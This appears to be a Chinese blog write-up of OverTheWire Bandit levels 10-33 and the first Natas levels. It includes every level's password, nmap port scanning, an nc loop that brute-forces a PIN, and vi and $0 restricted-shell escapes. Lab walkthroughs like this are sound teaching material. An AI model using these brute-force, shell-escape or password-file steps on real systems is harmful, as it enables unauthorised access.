<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207131245597.png" alt="image-20200207131245597"></p>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207131452886.png" alt="image-20200207131452886"></p>
<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure>

<p>Rot13编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_decode</span>(<span class="params">message</span>):</span><br><span class="line">    PAIRS = <span class="built_in">dict</span>(<span class="built_in">zip</span>(<span class="string">&quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(PAIRS.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> message)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rot13_decode(s))</span><br></pre></td></tr></table></figure>

<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><blockquote>
<p>The password for the next level is stored in the file <strong>data.txt</strong>, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under &#x2F;tmp in which you can work using mkdir. For example: mkdir &#x2F;tmp&#x2F;myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure>

<p>xxd 转换十六进制为二进制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd -r file new_file</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207140936248.png" alt="image-20200207140936248"></p>
<p>重命名追加 .gz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d old.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141028896.png" alt="image-20200207141028896"></p>
<p>重命名追加 .bz2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bzip2 -d old.bz2</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141144691.png" alt="image-20200207141144691"></p>
<p>重命名追加 .gz，解压</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207141209611.png" alt="image-20200207141209611"></p>
<p>追加 .tar，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xf old.tar</span><br></pre></td></tr></table></figure>

<p>继续n重解压….</p>
<p>一直解压到 data8 得到密码</p>
<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><blockquote>
<p>The password for the next level is stored in <strong>&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14 and can only be read by user bandit14</strong>. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. <strong>Note:</strong> <strong>localhost</strong> is a hostname that refers to the machine you are working on</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br></pre></td></tr></table></figure>

<p>在用户当前用户家目录下有一个 <code>sshkey.private</code> 文件，保存到本地后利用它可登陆 bandit14 用户</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207144934481.png" alt="image-20200207144934481"></p>
<p>选择 public key 后点浏览-导入选择密钥文件，连接即可</p>
<p>或者是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit14@bandit.labs.overthewire.org -p 2220 -i ssh.key</span><br></pre></td></tr></table></figure>



<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30000 on localhost</strong>.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207145503314.png" alt="image-20200207145503314"></p>
<h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to <strong>port 30001 on localhost</strong> using SSL encryption.</p>
<p><strong>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</strong></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ncat localhost 30001 --ssl</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207150432091.png" alt="image-20200207150432091"></p>
<h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The credentials for the next level can be retrieved by submitting the password of the current level to <strong>a port on localhost in the range 31000 to 32000</strong>. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>
</blockquote>
<p><code>nmap</code> 扫描指定端口：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p31000-32000 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207150936853.png" alt="image-20200207150936853"></p>
<p>探测端口开放的服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p31518,31790 -sV 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207152201483.png" alt="image-20200207152201483"></p>
<p>根据反馈结果判定是 31790 端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ncat localhost 31790 --ssl</span><br></pre></td></tr></table></figure>

<p>发送当前关密码得到下一关的登录密钥</p>
<h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><blockquote>
<p>There are 2 files in the homedirectory: <strong>passwords.old and passwords.new</strong>. The password for the next level is in <strong>passwords.new</strong> and is the only line that has been changed between <strong>passwords.old and passwords.new</strong></p>
<p><strong>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19</strong></p>
</blockquote>
<p>diff 命令</p>
<p>比较文件的差异：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">diff passwords.old passwords.new</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207152951604.png" alt="image-20200207152951604"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207153111109.png" alt="image-20200207153111109"></p>
<h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The password for the next level is stored in a file <strong>readme</strong> in the homedirectory. Unfortunately, someone has modified <strong>.bashrc</strong> to log you out when you log in with SSH.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh bandit18@bandit.labs.overthewire.org -p 2220 &quot;cat readme&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207153632156.png" alt="image-20200207153632156"></p>
<h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure>

<blockquote>
<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (&#x2F;etc&#x2F;bandit_pass), after you have used the setuid binary.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207155850897.png" alt="image-20200207155850897"></p>
<p>该程序能够以bandit20的身份执行命令，查看密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">./bandit20-<span class="keyword">do</span> <span class="built_in">cat</span> /etc/bandit_pass/bandit20</span></span><br></pre></td></tr></table></figure>

<h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
<p><strong>NOTE:</strong> Try connecting to your own network daemon to see if it works as you think</p>
</blockquote>
<p><code>tmux</code> 常用快捷键：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Ctrl+B &quot; 横向分割窗口</span><br><span class="line">Ctrl+B % 纵向分割窗口</span><br><span class="line">Ctrl+B &amp; 确认后退出当前tmux</span><br><span class="line">Ctrl+B d 脱离当前会话</span><br></pre></td></tr></table></figure>



<p>一边用 <code>nc</code> 监听端口，另一边使用程序连接端口：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207161920525.png" alt="image-20200207161920525"></p>
<h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
</blockquote>
<ol>
<li><p>进入<code>etc/cron.d</code> 目录：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163750299.png" alt="image-20200207163750299"></p>
</li>
<li><p>查看 <code>cronjob_bandit22</code> 文件</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163819469.png" alt="image-20200207163819469"></p>
</li>
<li><p>查看脚本文件：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207163840037.png" alt="image-20200207163840037"></p>
</li>
<li><p>该任务是将 bandit22 的密码写入 tmp 目录下一个文件中，读取即可得到密码</p>
</li>
</ol>
<h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
<p><strong>NOTE:</strong> Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>
</blockquote>
<p>同上，查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207165229830.png" alt="image-20200207165229830"></p>
<p>分析获取文件名：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207165437670.png" alt="image-20200207165437670"></p>
<h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong> for the configuration and see what command is being executed.</p>
<p><strong>NOTE:</strong> This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
</blockquote>
<p>前部分操作一致，查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200207180648605.png" alt="image-20200207180648605"></p>
<p>复制上一关的脚本即可，在<code>/var/spool/bandit24</code> 目录下任意创建一个脚本文件，保存内容为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">myname=$(<span class="built_in">whoami</span>)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | <span class="built_in">md5sum</span> | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br></pre></td></tr></table></figure>

<p>后续操作同上一关</p>
<h2 id="Level-24"><a href="#Level-24" class="headerlink" title="Level 24"></a>Level 24</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
</blockquote>
<p>这一关需要编写 shell 脚本进行爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">for (( i=0; i&lt;=9999; i++))</span><br><span class="line">	do</span><br><span class="line">		j=`printf &quot;%04d&quot; $i`</span><br><span class="line">		echo $c $j</span><br><span class="line">	done | nc localhost 30002 </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208183559500.png" alt="image-20200208183559500"></p>
<h2 id="Level-25"><a href="#Level-25" class="headerlink" title="Level 25"></a>Level 25</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not <strong>&#x2F;bin&#x2F;bash</strong>, but something else. Find out what it is, how it works and how to break out of it.</p>
</blockquote>
<p>根据提示，查看 <code>/etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208183819218.png" alt="image-20200208183819218"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208185606783.png" alt="image-20200208185606783"></p>
<p>查看该文件：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208190304077.png" alt="image-20200208190304077"></p>
<p>另外在bandit25家目录下有bandit26.sshkey文件</p>
<p>直接连接的话连接直接会断开：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208185455368.png" alt="image-20200208185455368"></p>
<p>再回看脚本，可利用more的特性，将终端高度调整到最小再连接：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208190400819.png" alt="image-20200208190400819"></p>
<p>然后按 v 进入vi编辑器</p>
<p>然后通过vi编辑器打开我们需要的 bandit26 的密码</p>
<p>这里用到vi打开文件：</p>
<ul>
<li>在vi打开一个文件的时候，在命令行模式下可通过输入<code>sp filename</code> 分屏打开另一个文件(sp&#x3D;split，vsp&#x3D;vsplit) [切换窗口 Ctrl+ww]</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208191337629.png" alt="image-20200208191337629"></p>
<h2 id="Level-26"><a href="#Level-26" class="headerlink" title="Level 26"></a>Level 26</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>
</blockquote>
<p>同样通过more进入vi</p>
<p>不过没有权限通过 <code>:. w !ls</code> 之类的执行shell命令，需要设置一个shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:sh</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208194033762.png" alt="image-20200208194033762"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208194229834.png" alt="image-20200208194229834"></p>
<h2 id="Level-27"><a href="#Level-27" class="headerlink" title="Level 27"></a>Level 27</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit27-git@localhost/home/bandit27-git/repo</code>. The password for the user <code>bandit27-git</code> is the same as for the user <code>bandit27</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>Git 常用命令：<a href="https://blog.csdn.net/lxw198902165221/article/details/89228458">https://blog.csdn.net/lxw198902165221/article/details/89228458</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone ssh://bandit27-git@localhost/home/bandit27-git/repo /tmp/repo_t</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208195828240.png" alt="image-20200208195828240"></p>
<h2 id="Level-28"><a href="#Level-28" class="headerlink" title="Level 28"></a>Level 28</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit28-git@localhost/home/bandit28-git/repo</code>. The password for the user <code>bandit28-git</code> is the same as for the user <code>bandit28</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>同上一关的操作：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208200107789.png" alt="image-20200208200107789"></p>
<p>不过密码被隐藏了，<code>git log</code> 查看日志：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208200931456.png" alt="image-20200208200931456"></p>
<p><code>git show</code> 默认会有 <code>git diff -tree --cc</code> 的格式，可以查看文本的差异</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201103358.png" alt="image-20200208201103358"></p>
<h2 id="Level-29"><a href="#Level-29" class="headerlink" title="Level 29"></a>Level 29</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bbc96594b4e001778eee9975372716b2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit29-git@localhost/home/bandit29-git/repo</code>. The password for the user <code>bandit29-git</code> is the same as for the user <code>bandit29</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>按照之前的操作一遍，结果什么都没有，查看所有分支:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201531922.png" alt="image-20200208201531922"></p>
<p>选择其中一个分支:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b remotes/origin/dev</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201753238.png" alt="image-20200208201753238"></p>
<h2 id="Level-30"><a href="#Level-30" class="headerlink" title="Level 30"></a>Level 30</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5b90576bedb2cc04c86a9e924ce42faf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit30-git@localhost/home/bandit30-git/repo</code>. The password for the user <code>bandit30-git</code> is the same as for the user <code>bandit30</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>重复上一关操作，发现只有一个分支，没有其他有用的数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git show-ref # 显示本地引用</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208202535432.png" alt="image-20200208202535432"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<h2 id="Level-31"><a href="#Level-31" class="headerlink" title="Level 31"></a>Level 31</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">47e603bb428404d265f59c42920d81e5</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit31-git@localhost/home/bandit31-git/repo</code>. The password for the user <code>bandit31-git</code> is the same as for the user <code>bandit31</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203256797.png" alt="image-20200208203256797"></p>
<p>这一次需要往仓库push一个文件，命名为 <code>key.txt</code>，内容为 <code>May I come in?</code></p>
<p>创建好文件后把它加入缓冲区：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203414700.png" alt="image-20200208203414700"></p>
<p>提交修改到仓库：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203528661.png" alt="image-20200208203528661"></p>
<p>推送到仓库，得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203620705.png" alt="image-20200208203620705"></p>
<h2 id="Level-32"><a href="#Level-32" class="headerlink" title="Level 32"></a>Level 32</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">56a9bf19c63d650ce78e6ec0354ee45e</span><br></pre></td></tr></table></figure>

<blockquote>
<p>After all this <code>git</code> stuff its time for another escape. Good luck!</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208204505341.png" alt="image-20200208204505341"></p>
<p>所有指令都变为了大写，这里就用到 shell 的特殊变量：</p>
<p>shell 特殊变量：</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>当前脚本的文件名</td>
</tr>
<tr>
<td><code>$n</code></td>
<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是$1，第二个参数是​$2。</td>
</tr>
<tr>
<td><code>$#</code></td>
<td>传递给脚本或函数的参数个数。</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>传递给脚本或函数的所有参数。</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>传递给脚本或函数的所有参数。被双引号(“ “)包含时，与 $* 稍有不同，下面将会讲到。</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>上个命令的退出状态，或函数的返回值。</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>当前Shell进程ID。对于 Shell 脚本，就是这些脚本所在的进程ID。</td>
</tr>
</tbody></table>
<p>执行 <code>$0</code> 即相当于执行 <code>sh</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208205519666.png" alt="image-20200208205519666"></p>
<h2 id="Level-33"><a href="#Level-33" class="headerlink" title="Level 33"></a>Level 33</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c9c3199ddf4121b10cf581a98d51caee</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>At this moment, level 34 does not exist yet.</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>OverTheWire-Natas 靶场</title>
    <url>/2020/02/08/OverTheWire-Natas/</url>
    <content><![CDATA[<h1 id="OverTheWire-Natas-靶场"><a href="#OverTheWire-Natas-靶场" class="headerlink" title="OverTheWire Natas 靶场"></a>OverTheWire Natas 靶场</h1><blockquote>
<p><a href="https://overthewire.org/wargames/natas/">https://overthewire.org/wargames/natas/</a></p>
</blockquote>
<blockquote>
<p>起始：<a href="http://natas0.natas.labs.overthewire.org/">http://natas0.natas.labs.overthewire.org</a></p>
</blockquote>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">natas0</span><br></pre></td></tr></table></figure>

<p>右键查看源代码得到下一关密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208210707377.png" alt="image-20200208210707377"></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gtVrDuiDfck831PqWsLEZy5gyDz1clto </span><br></pre></td></tr></table></figure>

<p>这一关右键被锁定，那就通过 F12 查看源码得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208210943249.png" alt="image-20200208210943249"></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</span><br></pre></td></tr></table></figure>

<p>访问网页后，页面内没有任何东西，只引用了一个一个像素点的图片：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213223076.png" alt="image-20200208213223076"></p>
<p>这个图片文件也没有任何东西，但是访问&#x2F;files文件夹时发现这个目录可列：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213329941.png" alt="image-20200208213329941"></p>
<p>访问users.txt获得密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213346465.png" alt="image-20200208213346465"></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213433653.png" alt="image-20200208213433653"></p>
<p>根据提示，说连Google都找不到，猜测是robots协议，尝试访问 robots.txt</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213518821.png" alt="image-20200208213518821"></p>
<p>访问目录得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213540871.png" alt="image-20200208213540871"></p>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213633809.png" alt="image-20200208213633809"></p>
<p>根据提示，添加Refer:</p>
